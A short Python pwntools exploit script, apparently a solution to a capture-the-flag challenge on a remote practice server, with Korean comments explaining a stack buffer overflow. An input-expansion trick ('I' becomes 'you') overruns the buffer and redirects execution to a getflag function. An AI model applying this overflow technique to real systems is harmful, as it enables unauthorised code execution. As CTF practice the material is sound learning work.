from pwn import *

r = remote("ctf.j0n9hyun.xyz", 3011)

# 0x3c+4 == 0x40 만큼 덮고 getflag 함수의 주소로 덮는다
# 0x20만큼 업력을 받을 수 있고, I가 you로 대치 된다. 3배가 되므로, 
# 0x15 * 3 == 0ㅌ3F, + A + 주소로 payload를 만든다
payload  = b"I"*0x15
payload += b"A"
payload += p32(0x8048f0d)

r.sendline(payload)

r.interactive()